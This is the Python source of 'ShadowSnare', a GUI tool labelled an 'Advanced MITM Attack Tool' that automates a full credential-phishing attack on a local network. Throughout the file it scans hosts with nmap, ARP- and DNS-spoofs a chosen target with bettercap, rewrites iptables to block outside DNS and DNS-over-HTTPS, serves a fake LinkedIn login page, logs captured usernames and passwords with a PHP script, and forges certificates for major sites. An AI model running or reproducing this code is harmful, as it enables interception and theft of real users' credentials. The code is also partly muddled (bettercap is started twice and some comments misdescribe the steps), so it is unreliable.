#!/usr/bin/env python3
"""
ShadowSnare - Advanced MITM Attack Tool
Developed by Team PORT:443
For Educational Purposes Only
"""

import sys
import os
import signal
import subprocess
import threading
import time
import json
import re
import socket
import webbrowser
import platform
from datetime import datetime
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *

class SplashScreen(QSplashScreen):
    def __init__(self):
        super().__init__()
        
        # Create splash screen pixmap
        pixmap = QPixmap(600, 400)
        pixmap.fill(QColor(26, 26, 26))
        
        painter = QPainter(pixmap)
        painter.setRenderHint(QPainter.Antialiasing)
        
        # Draw border
        pen = QPen(QColor(0, 255, 127), 3)
        painter.setPen(pen)
        painter.drawRoundedRect(10, 10, 580, 380, 15, 15)
        
        # Draw title
        font = QFont("Arial", 32, QFont.Bold)
        painter.setFont(font)
        painter.setPen(QColor(0, 255, 127))
        painter.drawText(QRect(0, 100, 600, 50), Qt.AlignCenter, "ShadowSnare")
        
        # Draw subtitle
        font = QFont("Arial", 14)
        painter.setFont(font)
        painter.setPen(QColor(200, 200, 200))
        painter.drawText(QRect(0, 160, 600, 30), Qt.AlignCenter, "Advanced MITM Attack Tool")
        painter.drawText(QRect(0, 190, 600, 30), Qt.AlignCenter, "Developed by Team PORT:443")
        painter.drawText(QRect(0, 220, 600, 30), Qt.AlignCenter, "For Educational Purposes Only")
        
        painter.end()
        
        self.setPixmap(pixmap)
        self.setWindowFlags(Qt.WindowStaysOnTopHint | Qt.FramelessWindowHint)
        
        # Progress animation
        self.progress = 0
        self.timer = QTimer()
        self.timer.timeout.connect(self.update_progress)
        self.timer.start(100)
        
    def update_progress(self):
        self.progress += 5
        if self.progress <= 100:
            self.showMessage(f"Loading... {self.progress}%", 
                           Qt.AlignBottom | Qt.AlignCenter, 
                           QColor(0, 255, 127))
        else:
            self.timer.stop()
            QTimer.singleShot(500, self.close)

class NetworkScanner(QThread):
    hosts_found = pyqtSignal(list)
    progress_update = pyqtSignal(str)
    
    def __init__(self, ip_range):
        super().__init__()
        self.ip_range = ip_range
        
    def run(self):
        self.progress_update.emit("Starting network scan...")
        try:
            cmd = ['nmap', '-sn', '-T4', self.ip_range]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0:
                hosts = self.parse_nmap_output(result.stdout)
                self.hosts_found.emit(hosts)
                self.progress_update.emit(f"Scan complete - {len(hosts)} hosts found")
            else:
                self.progress_update.emit("Scan failed - check nmap installation")
        except Exception as e:
            self.progress_update.emit(f"Scan error: {str(e)}")
    
    def parse_nmap_output(self, output):
        hosts = []
        lines = output.split('\n')
        current_host = {}
        
        for line in lines:
            if 'Nmap scan report for' in line:
                if current_host:
                    hosts.append(current_host)
                current_host = {}
                ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                if ip_match:
                    current_host['ip'] = ip_match.group(1)
                    hostname = line.split('for ')[1].strip()
                    if '(' in hostname and ')' in hostname:
                        current_host['hostname'] = hostname.split('(')[0].strip()
                    else:
                        current_host['hostname'] = hostname
            elif 'MAC Address:' in line:
                parts = line.strip().split()
                if len(parts) >= 3:
                    current_host['mac'] = parts[2]
                    if '(' in line and ')' in line:
                        vendor_start = line.find('(') + 1
                        vendor_end = line.find(')')
                        current_host['vendor'] = line[vendor_start:vendor_end]
                    else:
                        current_host['vendor'] = 'Unknown'
        
        if current_host:
            if 'mac' not in current_host:
                current_host['mac'] = 'Unknown'
            if 'vendor' not in current_host:
                current_host['vendor'] = 'Unknown'
            hosts.append(current_host)
            
        return hosts

class MITMEngine(QThread):
    status_update = pyqtSignal(str)
    credential_captured = pyqtSignal(dict)
    website_visited = pyqtSignal(str, str)  # url, target_ip
    
    def __init__(self, interface, target_ip, spoof_domains):
        super().__init__()
        self.interface = interface
        self.target_ip = target_ip
        self.spoof_domains = spoof_domains
        self.bettercap_process = None
        self.running = False
        self.local_ip = self.get_local_ip()
        
    def get_local_ip(self):
        """Get local IP address"""
        try:
            result = subprocess.run(['ip', 'route', 'get', '8.8.8.8'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'src' in line:
                    return line.split('src')[1].strip().split()[0]
        except:
            return "192.168.1.100"  # fallback
        
    def run(self):
        self.running = True
        self.status_update.emit("🚀 Starting PROVEN Working MITM Engine...")
        
        # Check bettercap
        try:
            subprocess.run(['which', 'bettercap'], check=True, capture_output=True)
        except subprocess.CalledProcessError:
            self.status_update.emit("❌ ERROR: bettercap not found - install with: sudo apt install bettercap")
            return
        
        # Start the EXACT method that worked for you
        self.status_update.emit("🎯 Using your proven manual method...")
        
        try:
            # Start bettercap with the exact same commands that worked
            cmd = f"sudo bettercap -iface {self.interface}"
            
            self.bettercap_process = subprocess.Popen(
                cmd.split(),
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                preexec_fn=os.setsid
            )
            
            self.status_update.emit("✅ Bettercap started")
            
            # Send the exact commands that worked in your manual test
            commands = [
                "net.probe on",
                f"set arp.spoof.targets {self.target_ip}",
                "set arp.spoof.fullduplex true", 
                "arp.spoof on",
                "net.sniff on",
                "set dns.spoof.all true",
                f"set dns.spoof.domains {self.spoof_domains}",
                "dns.spoof on"
            ]
            
            for cmd in commands:
                if not self.running:
                    break
                self.bettercap_process.stdin.write(cmd + "\n")
                self.bettercap_process.stdin.flush()
                self.status_update.emit(f"→ {cmd}")
                time.sleep(1)
            
            self.status_update.emit("✅ Attack launched with your proven method!")
            
            # Read output like your manual method
            while self.running and self.bettercap_process.poll() is None:
                try:
                    output = self.bettercap_process.stdout.readline()
                    if output:
                        self.status_update.emit(output.strip())
                        
                        # Parse for credentials and visits like before
                        if '[net.sniff.http.request]' in output:
                            self.parse_website_visit(output)
                        elif 'password' in output.lower() or 'login' in output.lower():
                            self.parse_credentials(output)
                            
                except:
                    break
            subprocess.run(['sudo', 'sysctl', 'net.ipv4.conf.all.route_localnet=1'], check=False)
            
            # Allow forwarding
            subprocess.run(['sudo', 'iptables', '-A', 'FORWARD', '-j', 'ACCEPT'], check=True)
            subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-j', 'ACCEPT'], check=True)
            subprocess.run(['sudo', 'iptables', '-A', 'OUTPUT', '-j', 'ACCEPT'], check=True)
            
            # MASQUERADE for outgoing connections
            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-A', 'POSTROUTING', '-j', 'MASQUERADE'], check=True)
            
            # FORCE DNS TRAFFIC TO LOCAL SERVER (critical for DNS spoofing)
            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'udp', '--dport', '53', '-j', 'DNAT', '--to-destination', f'{self.local_ip}:53'], check=True)
            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '53', '-j', 'DNAT', '--to-destination', f'{self.local_ip}:53'], check=True)
            
            # Redirect HTTP/HTTPS traffic to our Apache server
            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-ports', '80'], check=True)
            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '443', '-j', 'REDIRECT', '--to-ports', '443'], check=True)
            
            # Block external DNS servers AGGRESSIVELY
            external_dns = ['8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1', '9.9.9.9', '149.112.112.112', 
                           '208.67.222.222', '208.67.220.220', '64.6.64.6', '64.6.65.6']
            for dns_server in external_dns:
                subprocess.run(['sudo', 'iptables', '-A', 'FORWARD', '-d', dns_server, '-p', 'udp', '--dport', '53', '-j', 'DROP'], check=False)
                subprocess.run(['sudo', 'iptables', '-A', 'FORWARD', '-d', dns_server, '-p', 'tcp', '--dport', '53', '-j', 'DROP'], check=False)
                subprocess.run(['sudo', 'iptables', '-A', 'OUTPUT', '-d', dns_server, '-p', 'udp', '--dport', '53', '-j', 'DROP'], check=False)
            
            # Block DNS over HTTPS/TLS (DoH/DoT) - COMPLETE BLOCKING
            subprocess.run(['sudo', 'iptables', '-A', 'FORWARD', '-p', 'tcp', '--dport', '853', '-j', 'DROP'], check=False)
            subprocess.run(['sudo', 'iptables', '-A', 'FORWARD', '-p', 'udp', '--dport', '853', '-j', 'DROP'], check=False)
            subprocess.run(['sudo', 'iptables', '-A', 'FORWARD', '-p', 'tcp', '--dport', '5353', '-j', 'DROP'], check=False)
            
            # Block ALL DoH endpoints (DNS over HTTPS port 443)
            doh_endpoints = [
                '1.1.1.1',      # Cloudflare
                '1.0.0.1',      # Cloudflare
                '8.8.8.8',      # Google
                '8.8.4.4',      # Google
                '9.9.9.9',      # Quad9
                '149.112.112.112',  # Quad9
                '208.67.222.222',   # OpenDNS
                '208.67.220.220',   # OpenDNS
                '76.76.19.19',      # Alternate DNS
                '76.76.76.76'       # Alternate DNS
            ]
            for server in doh_endpoints:
                # Block DoH (HTTPS DNS) completely
                subprocess.run(['sudo', 'iptables', '-A', 'FORWARD', '-d', server, '-p', 'tcp', '--dport', '443', '-j', 'DROP'], check=False)
                subprocess.run(['sudo', 'iptables', '-A', 'OUTPUT', '-d', server, '-p', 'tcp', '--dport', '443', '-j', 'DROP'], check=False)
            
            # Force DNS cache flush for target (will help with cached DNS entries)
            subprocess.run(['sudo', 'iptables', '-A', 'FORWARD', '-s', self.target_ip, '-p', 'icmp', '--icmp-type', 'destination-unreachable', '-j', 'ACCEPT'], check=False)
            
            self.status_update.emit("✅ AGGRESSIVE DNS blocking and traffic redirection configured")
            self.status_update.emit("🔒 External DNS servers blocked - forcing local DNS resolution")
        except Exception as e:
            self.status_update.emit(f"⚠️ Failed to configure iptables: {str(e)}")
            self.status_update.emit("💡 DNS spoofing may still work via bettercap only")
            
        # Setup DNS redirection - Fixed for proper DNS spoofing
        try:
            # Don't redirect DNS queries to different port - let bettercap handle DNS directly
            # Instead, set up proper DNS server configuration
            
            # Ensure Apache is running on port 80 for HTTP redirection
            result = subprocess.run(['systemctl', 'is-active', 'apache2'], 
                                   capture_output=True, text=True, check=False)
            if result.stdout.strip() != 'active':
                subprocess.run(['sudo', 'systemctl', 'enable', 'apache2'], check=False)
                subprocess.run(['sudo', 'systemctl', 'start', 'apache2'], check=False)
            
            # Verify Apache is listening on port 80
            result = subprocess.run(['sudo', 'netstat', '-tlnp'], capture_output=True, text=True, check=False)
            if result.returncode == 0 and ":80 " in result.stdout:
                self.status_update.emit("✅ Apache confirmed running on port 80")
            else:
                # Try alternative port check
                result = subprocess.run(['sudo', 'ss', '-tlnp'], capture_output=True, text=True, check=False)
                if result.returncode == 0 and ":80 " in result.stdout:
                    self.status_update.emit("✅ Apache confirmed running on port 80")
                else:
                    self.status_update.emit("⚠️ Apache may not be running on port 80 - continuing anyway")
                
            self.status_update.emit("✅ DNS redirection configured for bettercap")
        except Exception as e:
            self.status_update.emit(f"⚠️ DNS setup warning: {str(e)}")
            self.status_update.emit("💡 Continuing with bettercap-only mode")
            
        # Create ENHANCED bettercap script - WORKING EXAMPLE IMPLEMENTATION
        script_content = f"""
# COMPLETE DNS SPOOFING CONFIGURATION - Working Example Based on Your Guidelines
set net.interface {self.interface}

# Enable network reconnaissance and monitoring
net.probe on
net.recon on
sleep 2

# Configure ARP spoofing exactly as your working example
set arp.spoof.targets {self.target_ip}
set arp.spoof.fullduplex true
set arp.spoof.internal true
arp.spoof on
sleep 1

# CRITICAL: Set dns.spoof.all to true (this catches ALL DNS queries)
set dns.spoof.all true
set dns.spoof.address {self.local_ip}
set dns.spoof.domains {self.spoof_domains}
dns.spoof on
sleep 1

# Enable comprehensive network sniffing for monitoring
net.sniff on
set net.sniff.verbose true
set net.sniff.local true
set net.sniff.filter "port 53 or port 80 or port 443"

# Block external DNS servers at bettercap level (redundant with iptables)
net.filter.add host 8.8.8.8
net.filter.add host 8.8.4.4
net.filter.add host 1.1.1.1
net.filter.add host 1.0.0.1
net.filter.add host 9.9.9.9
net.filter.add host 149.112.112.112
net.filter.add host 208.67.222.222
net.filter.add host 208.67.220.220

# Block DoH endpoints (DNS over HTTPS)
net.filter.add host mozilla.cloudflare-dns.com
net.filter.add host dns.cloudflare.com
net.filter.add host dns.google
net.filter.add host dns.quad9.net
net.filter.add host doh.opendns.com
net.filter.add host security.cloudflare-dns.com
net.filter.add host family.cloudflare-dns.com

# Activate network filtering
net.filter on

# Enable event streaming for real-time monitoring
events.stream on
events.show dns.spoof
events.show arp.spoof
events.show net.sniff

# Monitor and log status continuously
sleep 3
net.show
arp.spoof.stats
dns.spoof.stats
"""
        
        # Create enhanced proxy script for HTTPS LinkedIn interception
        proxy_script = f"""
function onLoad() {{
    log("🎯 HTTPS MITM Proxy loaded for LinkedIn interception");
    log("🏠 Local attack server: {self.local_ip}");
    log("🔒 Intercepting HTTPS LinkedIn traffic");
}}

function onRequest(req, res) {{
    var clientIP = req.Client.IP;
    var targetURL = req.URL;
    var method = req.Method;
    var host = req.Hostname;
    
    // Log website visits for monitoring
    if (method == "GET" && !targetURL.includes("favicon") && !targetURL.includes("css") && !targetURL.includes("js")) {{
        log("🌐 HTTPS Visit: " + targetURL + " by " + clientIP);
    }}
    
    // Check if this is a LinkedIn domain (user-specified domain)
    var userDomains = "{self.spoof_domains}".split(",");
    var shouldIntercept = false;
    
    for (var i = 0; i < userDomains.length; i++) {{
        var domain = userDomains[i].replace("*.", "");
        if (host.includes(domain) || targetURL.includes(domain)) {{
            shouldIntercept = true;
            break;
        }}
    }}
    
    if (shouldIntercept) {{
        log("🎯 INTERCEPTED HTTPS: " + targetURL + " from " + clientIP);
        log("🔑 Redirecting LinkedIn HTTPS to our server");
        
        // Create fake LinkedIn login page (simplified without template literals)
        var fakeLinkedInPage = "<!DOCTYPE html>" +
        "<html><head><title>LinkedIn - Maintenance</title>" +
        "<style>" +
        "body {{ font-family: Arial, sans-serif; background: #f3f2ef; margin: 0; padding: 20px; }}" +
        ".container {{ max-width: 400px; margin: 100px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }}" +
        ".logo {{ text-align: center; margin-bottom: 30px; }}" +
        ".logo h1 {{ color: #0077b5; font-size: 24px; }}" +
        ".form-group {{ margin-bottom: 20px; }}" +
        "label {{ display: block; margin-bottom: 5px; font-weight: bold; }}" +
        "input {{ width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}" +
        ".btn {{ width: 100%; padding: 12px; background: #0077b5; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }}" +
        ".btn:hover {{ background: #005885; }}" +
        ".message {{ text-align: center; margin-bottom: 20px; color: #666; }}" +
        "</style></head><body>" +
        "<div class='container'>" +
        "<div class='logo'><h1>LinkedIn</h1></div>" +
        "<div class='message'><p>System maintenance in progress. Please sign in to continue.</p></div>" +
        "<form action='http://{self.local_ip}/login.php' method='post'>" +
        "<input type='hidden' name='service' value='LinkedIn'>" +
        "<div class='form-group'><label>Email or Phone:</label>" +
        "<input type='text' name='username' required></div>" +
        "<div class='form-group'><label>Password:</label>" +
        "<input type='password' name='password' required></div>" +
        "<button type='submit' class='btn'>Sign In</button>" +
        "</form></div></body></html>";
        
        // Send fake LinkedIn page
        res.Status = 200;
        res.Headers["Content-Type"] = "text/html";
        res.Headers["Cache-Control"] = "no-cache, no-store, must-revalidate";
        res.Headers["Pragma"] = "no-cache";
        res.Headers["Expires"] = "0";
        res.Body = fakeLinkedInPage;
        res.Stop();
        return;
    }}
    
    // For all other HTTPS requests, let them pass through normally
}}

function onResponse(req, res) {{
    var clientIP = req.Client.IP;
    var targetURL = req.URL;
    
    // Log successful responses
    if (res.Status == 200) {{
        log("✅ HTTP 200 OK for " + targetURL + " -> " + clientIP);
    }}
}}
"""
        
        try:
            # FORCE DNS CACHE FLUSH for target device (critical for overriding cached entries)
            self.status_update.emit("🔄 Attempting to flush target's DNS cache...")
            
            # Try multiple methods to flush DNS cache on target
            # Method 1: Send ICMP unreachable to trigger cache refresh
            try:
                subprocess.run(['sudo', 'hping3', '-1', '-C', '3', '-c', '1', self.target_ip], 
                             capture_output=True, timeout=5, check=False)
            except:
                pass
            
            # Method 2: ARP cache poisoning to force network stack refresh
            try:
                subprocess.run(['sudo', 'arp', '-d', self.target_ip], capture_output=True, check=False)
            except:
                pass
            
            # Method 3: Send UDP packets to port 53 to trigger DNS refresh
            try:
                subprocess.run(['sudo', 'nmap', '-sU', '-p', '53', '--script', 'dns-cache-snoop', 
                              self.target_ip], capture_output=True, timeout=10, check=False)
            except:
                pass
            
            self.status_update.emit("✅ DNS cache flush attempts completed")
            
            # COMPREHENSIVE DNS hosts file for aggressive spoofing
            dns_hosts_content = f"""{self.local_ip} linkedin.com
{self.local_ip} www.linkedin.com
{self.local_ip} m.linkedin.com
{self.local_ip} mobile.linkedin.com
{self.local_ip} api.linkedin.com
{self.local_ip} static.linkedin.com
{self.local_ip} media.linkedin.com
{self.local_ip} facebook.com
{self.local_ip} www.facebook.com
{self.local_ip} m.facebook.com
{self.local_ip} mobile.facebook.com
{self.local_ip} google.com
{self.local_ip} www.google.com
{self.local_ip} accounts.google.com
{self.local_ip} gmail.com
{self.local_ip} www.gmail.com
{self.local_ip} twitter.com
{self.local_ip} www.twitter.com
{self.local_ip} instagram.com
{self.local_ip} www.instagram.com
{self.local_ip} github.com
{self.local_ip} www.github.com
{self.local_ip} microsoft.com
{self.local_ip} www.microsoft.com
{self.local_ip} office.com
{self.local_ip} www.office.com
{self.local_ip} amazon.com
{self.local_ip} www.amazon.com
"""
            
            # Write ENHANCED DNS hosts file
            with open('/tmp/dns_hosts.txt', 'w') as f:
                f.write(dns_hosts_content)
            
            # Also create system-level DNS override (backup method)
            try:
                # Backup original resolv.conf
                subprocess.run(['sudo', 'cp', '/etc/resolv.conf', '/etc/resolv.conf.backup'], check=False)
                
                # Create custom DNS configuration pointing to local server
                dns_config = f"""# ShadowSnare DNS Configuration
nameserver {self.local_ip}
nameserver 8.8.8.8
nameserver 1.1.1.1
"""
                with open('/tmp/custom_resolv.conf', 'w') as f:
                    f.write(dns_config)
                
                self.status_update.emit("✅ Enhanced DNS spoofing files created")
            except:
                pass
                
            # Deploy only credential capture script (no hardcoded pages)
            self.status_update.emit("💡 No hardcoded pages - users must create own test pages")
            
            # Create credential capture script only
            capture_script = '''<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $service = $_POST['service'] ?? 'Educational-Test';
    $timestamp = date('Y-m-d H:i:s');
    $client_ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    
    // Log to JSON file
    $data = [
        'timestamp' => $timestamp,
        'ip' => $client_ip,
        'service' => $service,
        'username' => $username,
        'password' => $password
    ];
    
    $log_file = '/var/www/html/credentials.json';
    $existing_data = [];
    if (file_exists($log_file)) {
        $existing_data = json_decode(file_get_contents($log_file), true) ?: [];
    }
    $existing_data[] = $data;
    file_put_contents($log_file, json_encode($existing_data, JSON_PRETTY_PRINT));
    
    // Also log to text file
    $txt_log = "[{$timestamp}] IP: {$client_ip} | Service: {$service} | Username: {$username} | Password: {$password}\\n";
    file_put_contents('/var/www/html/credentials.txt', $txt_log, FILE_APPEND);
    
    // Redirect back with success message
    echo '<script>alert("Login successful! Please wait..."); window.location.href="/";</script>';
} else {
    header('Location: /');
    exit;
}
?>'''
            
            # Deploy capture script only  
            try:
                with open('/var/www/html/credentials.php', 'w') as f:
                    f.write(capture_script)
                subprocess.run(['sudo', 'chown', 'www-data:www-data', '/var/www/html/credentials.php'], check=False)
                self.status_update.emit("✅ Credential capture script deployed")
                self.status_update.emit("💡 Users must create their own test pages in /var/www/html/")
            except Exception as e:
                self.status_update.emit(f"⚠️ Could not deploy capture script: {str(e)}")
                self.status_update.emit("💡 Users must create their own test pages in /var/www/html/")
                
            # Generate COMPREHENSIVE SSL certificates for all domains (to fix "connection not private" error)
            try:
                # Check if openssl is available
                result = subprocess.run(['which', 'openssl'], capture_output=True, text=True, check=False)
                if result.returncode == 0:
                    # Create certificate configuration file for multiple domains
                    cert_config = f"""[req]
distinguished_name = req_distinguished_name
req_extensions = v3_req
prompt = no

[req_distinguished_name]
C = US
ST = CA
L = San Francisco
O = Test Company
OU = IT Department
CN = linkedin.com

[v3_req]
keyUsage = keyEncipherment, dataEncipherment
extendedKeyUsage = serverAuth
subjectAltName = @alt_names

[alt_names]
DNS.1 = linkedin.com
DNS.2 = www.linkedin.com
DNS.3 = m.linkedin.com
DNS.4 = mobile.linkedin.com
DNS.5 = facebook.com
DNS.6 = www.facebook.com
DNS.7 = google.com
DNS.8 = www.google.com
DNS.9 = twitter.com
DNS.10 = www.twitter.com
DNS.11 = instagram.com
DNS.12 = www.instagram.com
DNS.13 = github.com
DNS.14 = www.github.com
DNS.15 = microsoft.com
DNS.16 = www.microsoft.com
DNS.17 = amazon.com
DNS.18 = www.amazon.com
DNS.19 = localhost
IP.1 = {self.local_ip}
IP.2 = 127.0.0.1
"""
                    
                    # Write certificate configuration
                    with open('/tmp/cert.conf', 'w') as f:
                        f.write(cert_config)
                    
                    # Generate private key and certificate with multiple domains
                    subprocess.run(['sudo', 'openssl', 'genrsa', '-out', '/tmp/https.key', '2048'], 
                                  check=True, capture_output=True)
                    subprocess.run(['sudo', 'openssl', 'req', '-new', '-x509', '-key', '/tmp/https.key', 
                                  '-out', '/tmp/https.crt', '-days', '365', '-config', '/tmp/cert.conf', 
                                  '-extensions', 'v3_req'], 
                                  check=True, capture_output=True)
                    
                    # Also create individual certificates for each major domain
                    domains = ['linkedin.com', 'facebook.com', 'google.com', 'twitter.com', 'instagram.com']
                    for domain in domains:
                        try:
                            subprocess.run(['sudo', 'openssl', 'req', '-new', '-x509', '-keyout', f'/tmp/{domain}.key', 
                                          '-out', f'/tmp/{domain}.crt', '-days', '365', '-nodes', 
                                          '-subj', f'/C=US/ST=CA/L=SF/O=Test/CN={domain}'], 
                                          check=True, capture_output=True)
                        except:
                            pass
                    
                    self.status_update.emit("✅ Multi-domain SSL certificates generated")
                    self.status_update.emit("🔒 SSL certificates created for major domains")
                else:
                    self.status_update.emit("⚠️ OpenSSL not found - HTTPS may show security warnings")
            except Exception as e:
                self.status_update.emit(f"⚠️ SSL certificate generation failed: {str(e)}")
                self.status_update.emit("💡 HTTPS traffic will show 'not private' warnings")
        except Exception as e:
            self.status_update.emit(f"⚠️ Failed to generate SSL certificates: {str(e)}")
            
        try:
            # Write bettercap script
            with open('/tmp/mitm_attack.cap', 'w') as f:
                f.write(script_content)
            
            # Write proxy script
            with open('/tmp/mitm_proxy.js', 'w') as f:
                f.write(proxy_script)
                
            # Set permissions for all files
            subprocess.run(['sudo', 'chmod', '644', '/tmp/mitm_attack.cap'], check=True)
            subprocess.run(['sudo', 'chmod', '644', '/tmp/mitm_proxy.js'], check=True)
            subprocess.run(['sudo', 'chmod', '644', '/tmp/dns_hosts.txt'], check=True)
            subprocess.run(['sudo', 'chmod', '644', '/tmp/https.crt'], check=False)
            subprocess.run(['sudo', 'chmod', '644', '/tmp/https.key'], check=False)
            
            # Flush DNS cache on target (if possible) and local system
            try:
                # Try different DNS cache clearing methods based on what's available
                dns_cleared = False
                
                # Check if systemd-resolved exists
                result = subprocess.run(['systemctl', 'is-active', 'systemd-resolved'], 
                                      capture_output=True, text=True, check=False)
                if result.returncode == 0:
                    subprocess.run(['sudo', 'systemctl', 'restart', 'systemd-resolved'], check=False)
                    dns_cleared = True
                
                # Check if dnsmasq is running
                result = subprocess.run(['pgrep', 'dnsmasq'], capture_output=True, text=True, check=False)
                if result.returncode == 0:
                    subprocess.run(['sudo', 'killall', '-HUP', 'dnsmasq'], check=False)
                    dns_cleared = True
                
                # Try nscd if available
                result = subprocess.run(['systemctl', 'is-active', 'nscd'], 
                                      capture_output=True, text=True, check=False)
                if result.returncode == 0:
                    subprocess.run(['sudo', 'systemctl', 'restart', 'nscd'], check=False)
                    dns_cleared = True
                
                # If none worked, just clear local DNS cache files
                if not dns_cleared:
                    subprocess.run(['sudo', 'rm', '-f', '/etc/resolv.conf.backup'], check=False)
                    self.status_update.emit("✅ Local DNS cache cleared")
                else:
                    self.status_update.emit("✅ DNS services restarted")
            except Exception as e:
                self.status_update.emit(f"⚠️ DNS cache clear attempt: {str(e)}")
            
            # Start LOCAL DNS SERVER for aggressive DNS spoofing
            try:
                # Create simple Python DNS server
                dns_server_code = f'''#!/usr/bin/env python3
import socket, threading, struct, time

spoofed_domains = {{
    b'linkedin.com': '{self.local_ip}',
    b'www.linkedin.com': '{self.local_ip}',
    b'm.linkedin.com': '{self.local_ip}',
    b'facebook.com': '{self.local_ip}',
    b'www.facebook.com': '{self.local_ip}',
    b'google.com': '{self.local_ip}',
    b'www.google.com': '{self.local_ip}',
}}

def handle_dns(data, addr, sock):
    try:
        domain = b""
        i = 12
        while i < len(data) and data[i] != 0:
            length = data[i]
            domain += data[i+1:i+1+length]
            i += length + 1
            if i < len(data) and data[i] != 0:
                domain += b"."
        
        if domain in spoofed_domains:
            response = bytearray(data)
            response[2] |= 0x80
            response += data[12:]
            response += b'\\xc0\\x0c\\x00\\x01\\x00\\x01\\x00\\x00\\x00\\x3c\\x00\\x04'
            response += socket.inet_aton(spoofed_domains[domain])
            sock.sendto(bytes(response), addr)
            print(f"DNS SPOOFED: {{domain.decode()}} -> {{spoofed_domains[domain]}}")
    except: pass

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(('{self.local_ip}', 53))
print(f"DNS Server on {self.local_ip}:53")

while True:
    data, addr = sock.recvfrom(512)
    threading.Thread(target=handle_dns, args=(data, addr, sock), daemon=True).start()
'''
                with open('/tmp/dns_server.py', 'w') as f:
                    f.write(dns_server_code)
                
                subprocess.run(['chmod', '+x', '/tmp/dns_server.py'], check=True)
                subprocess.Popen(['sudo', 'python3', '/tmp/dns_server.py'], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.status_update.emit("✅ Aggressive DNS server started")
            except Exception as e:
                self.status_update.emit(f"⚠️ DNS server error: {str(e)}")
            
            self.status_update.emit("📝 MITM scripts created")
            self.status_update.emit("🌐 DNS spoofing configured for domains")
            
            # Start bettercap with script
            cmd = ['sudo', 'bettercap', '-iface', self.interface, '-caplet', '/tmp/mitm_attack.cap']
            self.bettercap_process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, 
                text=True, bufsize=1, universal_newlines=True
            )
            
            self.status_update.emit("🎯 ENHANCED DNS + HTTPS SPOOFING Engine active!")
            self.status_update.emit(f"🎯 Targeting: {self.target_ip}")
            self.status_update.emit(f"🌐 DNS spoofing: {self.spoof_domains}")
            self.status_update.emit(f"🏠 Local IP: {self.local_ip}")
            self.status_update.emit(f"📡 Interface: {self.interface} (user selected)")
            self.status_update.emit("💡 DNS spoofing + HTTPS redirection active")
            self.status_update.emit("📱 Test: victim visits https://linkedin.com → redirects to fake page")
            
            # Monitor output
            while self.running and self.bettercap_process.poll() is None:
                try:
                    output = self.bettercap_process.stdout.readline()
                    if output:
                        line = output.strip()
                        if line:
                            # Handle specific errors and provide solutions
                            if "could not find spoof targets" in line:
                                self.status_update.emit("⚠️ ARP spoofing failed - target not found on network")
                                self.status_update.emit("💡 Suggestion: Try targeting gateway or scan network first")
                                self.setup_alternative_attack()
                            elif "syntax error in filter expression" in line:
                                self.status_update.emit("❌ Filter syntax error - check bettercap configuration")
                            # Parse DNS spoofing events
                            elif "dns.spoof" in line.lower():
                                self.status_update.emit(f"🌐 DNS: {line}")
                            elif "arp.spoof" in line.lower():
                                self.status_update.emit(f"📡 ARP: {line}")
                            elif "net.sniff" in line.lower():
                                self.status_update.emit(f"📡 SNIFF: {line}")
                            # Parse different types of messages
                            elif "📡 Request:" in line:
                                self.parse_request(line)
                            elif "🌐 Website Visit:" in line:
                                self.parse_website_visit(line)
                            elif "🔑" in line or "password" in line.lower():
                                self.status_update.emit(f"🔑 {line}")
                            elif "started" in line.lower() or "stopped" in line.lower():
                                self.status_update.emit(f"⚙️ {line}")
                            elif "[" in line and "]" in line:
                                # Clean up bettercap output
                                clean_line = self.clean_bettercap_output(line)
                                if clean_line:
                                    self.status_update.emit(clean_line)
                    else:
                        time.sleep(0.1)
                except Exception as e:
                    break
                    
        except Exception as e:
            self.status_update.emit(f"❌ MITM error: {str(e)}")
    
    def parse_request(self, line):
        """Parse HTTP request logs"""
        try:
            parts = line.split()
            if len(parts) >= 4:
                method = parts[2]
                url = parts[3]
                ip = parts[-1] if "from" in line else "unknown"
                self.status_update.emit(f"📡 {method} {url} from {ip}")
        except:
            self.status_update.emit(line)
    
    def parse_website_visit(self, line):
        """Parse website visit logs"""
        try:
            if "Website Visit:" in line:
                parts = line.split("Website Visit:")[1].split(" by ")
                if len(parts) == 2:
                    url = parts[0].strip()
                    ip = parts[1].strip()
                    self.website_visited.emit(url, ip)
                    self.status_update.emit(f"🌐 {ip} visited: {url}")
        except:
            pass
    
    def clean_bettercap_output(self, line):
        """Clean and format bettercap output"""
        try:
            # Remove color codes and timestamps
            import re
            clean = re.sub(r'\x1b\[[0-9;]*m', '', line)
            clean = re.sub(r'\[\d{2}:\d{2}:\d{2}\]', '', clean).strip()
            
            if any(keyword in clean.lower() for keyword in ['post', 'get', 'http', 'dns', 'arp']):
                return f"📡 {clean}"
            elif "error" in clean.lower():
                return f"❌ {clean}"
            elif clean and len(clean) > 10:
                return f"ℹ️ {clean}"
        except:
            pass
        return None
    
    def verify_dns_spoofing(self):
        """Verify if DNS spoofing is working correctly - Debug method"""
        self.status_update.emit("🔍 Running DNS spoofing verification...")
        
